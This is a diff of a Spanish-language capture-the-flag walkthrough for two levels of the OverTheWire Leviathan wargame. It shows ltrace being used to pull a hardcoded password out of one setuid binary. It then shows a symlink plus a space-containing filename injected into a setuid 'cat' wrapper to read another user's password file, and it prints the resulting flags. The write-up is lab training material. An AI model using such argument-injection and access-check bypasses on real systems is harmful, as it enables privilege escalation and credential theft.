@@ -27,76 +27,115 @@ total 8
 -r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
 ```
 
-```bash
+Ejecutamos el programa y nos indica que debemos especificarle el nombre de un fichero para imprimirlo.
 
+```bash
+leviathan2@leviathan:~$ ls -l
+total 8
+-r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
+leviathan2@leviathan:~$ ./printfile 
+*** File Printer ***
+Usage: ./printfile filename
+leviathan2@leviathan:~$ ./printfile asdf.txt
+You cant have that file...
 ```
 
-
-Parace que hay un executable llamado **check** así que vamos a ejecutarlo.
+Vamos a probar a ver si nos deja imprimir por la password del directorio que hemos localizado antes.
 
 ```bash
-leviathan1@leviathan:~$ ./check
-password: asdfr
-Wrong password, Good Bye ...
+leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3
+You cant have that file...
 ```
 
-Observamos que tras introducir una contraseña aleatoria, nos devuelve un mensaje **Wrong Password, Godd Bye**
+¡Vaya! Nos nos deja :( . Tendremos que obligarle a que imprima un fichero de verdad.
 
-Parece que compara nuestro input con una la informacion de una variable que tiene en el programa y la compara. 
-Probamos sin éxito los comandos **strings**, **file** , **type** , etc. 
-
-Probamos a utilizar la herramienta **ltrace** para saber las llamadas que se hacen a las librerí
-Después de probar sin éxito los comandos **strings**, **file** , **type** , etc. 
-
-Probamos a utilizar la herramienta **ltrace** para saber las llamadas que se hacen a las librerías, al fin y al cabo el programa estar haciendo una comparación y est tirando de alguna librería.
+El mejor lugar para crear un fichero temporal es en la carpeta **tmp** del sistema por lo que vamos a crear uno allí.
 
 ```bash
-leviathan1@leviathan:~$ ltrace ./check
-__libc_start_main(0x804852d, 1, 0xffffd7f4, 0x80485f0 <unfinished ...>
-printf("password: ")                                                                                                          = 10
-getchar(0x8048680, 47, 0x804a000, 0x8048642password: abce
-)                                                                                  = 97
-getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                                                  = 98
-getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                                                  = 99
-strcmp("abc", "sex")                                                                                                          = -1
-puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
-)                                                                                          = 29
+leviathan2@leviathan:~$ mkdir /tmp/iker & touch /tmp/iker/asdf.txt
+[1] 318
+[1]+  Done                    mkdir /tmp/iker
+leviathan2@leviathan:~$ ls -l /tmp/iker/      
+total 0
+-rw-rw-r-- 1 leviathan2 leviathan2 0 Sep  6 15:24 asdf.txt
+```
+
+Ahora que ya hemos creado nuestro fichero vamos a intentar imprimirlo.
+
+```bash
+leviathan2@leviathan:~$ ./printfile /tmp/iker/asdf.txt
+leviathan2@leviathan:~$ 
+```
+
+Lo ejecutamos pero no nos da ningun error. Vamos a volver a ejecutarlo pero esta vez con el comando **ltrace** para ver que es lo que hace.
+
+```bash
+leviathan2@leviathan:~$ltrace ./printfile /tmp/iker/asdf.txt
+leviathan2@leviathan:~$ 
+```
+
+```bash
+leviathan2@leviathan:~$ ltrace ./printfile /tmp/iker/asdf.txt
+__libc_start_main(0x804852d, 2, 0xffffd7d4, 0x8048600 <unfinished ...>
+access("/tmp/iker/asdf.txt", 4)                                                                                               = 0
+snprintf("/bin/cat /tmp/iker/asdf.txt", 511, "/bin/cat %s", "/tmp/iker/asdf.txt")                                             = 27
+system("/bin/cat /tmp/iker/asdf.txt" <no return ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                                                        = 0
 +++ exited (status 0) +++
 ```
-¡BIEN! El programa utiliza una llamada la función **strcmp** y lo compara con el string **sex** ¡PERFEKTOA!
 
-Ahora que ya sabemos con que string compara el programa, únicamente tenemos que poner la palabra **sex** para que nos la valide.
+Tal y como pensaba, el programa realiza un **cat** sobre un parámetro que le pasemos desde el fichero **adsf.txt**
 
-Ejecutamos nuevamente el programa y vemos que es lo que pasa.
+Vamos a agregar el directorio que hemos comentado antes **/etc/leviathan_pass/leviathan3** al fichero **asdf.txt** de tal forma que el programa realice la lectura del fichero.
 
 ```bash
-leviathan1@leviathan:~$ ls -l
-total 8
--r-sr-x--- 1 leviathan2 leviathan1 7501 Jun 15 11:38 check
-leviathan1@leviathan:~$ ./check
-password: sex
-$ whoami
-leviathan2
-$ cd /etc/leviathan_pass
-$ ls -l
-total 32
--r-------- 1 leviathan0 leviathan0 11 Jun 15 11:37 leviathan0
--r-------- 1 leviathan1 leviathan1 11 Jun 15 11:37 leviathan1
--r-------- 1 leviathan2 leviathan2 11 Jun 15 11:37 leviathan2
--r-------- 1 leviathan3 leviathan3 11 Jun 15 11:37 leviathan3
--r-------- 1 leviathan4 leviathan4 11 Jun 15 11:38 leviathan4
--r-------- 1 leviathan5 leviathan5 11 Jun 15 11:38 leviathan5
--r-------- 1 leviathan6 leviathan6 11 Jun 15 11:38 leviathan6
--r-------- 1 leviathan7 leviathan7 11 Jun 15 11:38 leviathan7
-$ cat leviathan2
-ougahZi8Ta
+snprintf("/bin/cat /tmp/iker/asdf.txt", 511, "/bin/cat %s", "/tmp/iker/asdf.txt")   
 ```
-Hemos accedido al programa y hemos introducido el string correcto **sex** lo que nos ha devuelto una **shell** con el usuario **leviathan2**.
+**%s** será el contenido del fichero **/tmp/iker/asdf.txt**  que le pondremos la ruta **/etc/leviathan_pass/leviathan3** .
 
-Teniendo esto en cuenta, hemos investigado por el sistema y hemos encontrado un directorio llamado **/etc/leviathan_pass** donde están las contraseñas.
+```bash
+leviathan2@leviathan:~$ ./printfile /tmp/iker/asdf.txt
+/etc/leviathan_pass/leviathan3
+```
+Probamos el comando anterior pero solo muestra el contenido del fichero de asdf.txt, es decir, la ruta que hemos agregado manualmente. Algo se nos escapa. 
 
-Hacemos un **cat** del fichero **leviathan2** y nos muestra la flag 
+Vamos a analizar el código de nuevo.
+
+Vemos algo curioso a la hora de listar el directorio donde está el programa.
+
+```bash
+leviathan2@leviathan:~$ ls -l
+total 8
+-r-sr-x--- 1 leviathan3 leviathan2 7506 Jun 15 11:38 printfile
+```
+
+Observamos que el fichero **printfile** tambien tiene como usuario global a **leviathan3** y usuario real a **leviathan3**.
+
+```html
+Con procesos de Linux ejecutandose bajo un "user-ID". Esto les da acceso a todos los recursos (ficheros, etc...) a los que este usuario tendría acceso. Hay dos user-ID's. El user-ID real y el user-ID efectivo. El user-ID efectivo es el que determina el acceso a los ficheros. 
+```
+
+Es decir, que **leviathan3** es el **User-ID efectivo**, el que determina el acceso a los ficheros y **leviathan2** es el **User-ID Real**.
+
+Después de investigar un poco el código resultante de **ltrace** e internet, vemos que la llamada **access** se hace con el **User-Id Efectivo** en este caso y que podemos hacer un **bypass** 
+
+Después de pelear con los enlaces symbólicos consigo haver con la pass. 
+
+```bash
+leviathan2@leviathan:/tmp/iker$ ls -l
+total 4
+lrwxrwxrwx 1 leviathan2 leviathan2 30 Sep  6 15:58 asdf -> /etc/leviathan_pass/leviathan3
+-rw-rw-r-- 1 leviathan2 leviathan2 33 Sep  6 15:37 asdf.txt
+leviathan2@leviathan:/tmp/iker$ touch asdf\ asdf.txt
+leviathan2@leviathan:/tmp/iker$ ls -l
+total 4
+lrwxrwxrwx 1 leviathan2 leviathan2 30 Sep  6 15:58 asdf -> /etc/leviathan_pass/leviathan3
+-rw-rw-r-- 1 leviathan2 leviathan2  0 Sep  6 16:03 asdf asdf.txt
+leviathan2@leviathan:/tmp/iker$ ~/printfile "asdf asdf.txt"
+Ahdiemoo1j
+```
 
 :v: :sunglasses: :v:
 
-**FLAG** = {ougahZi8Ta} 
+**FLAG** = {Ahdiemoo1j} 
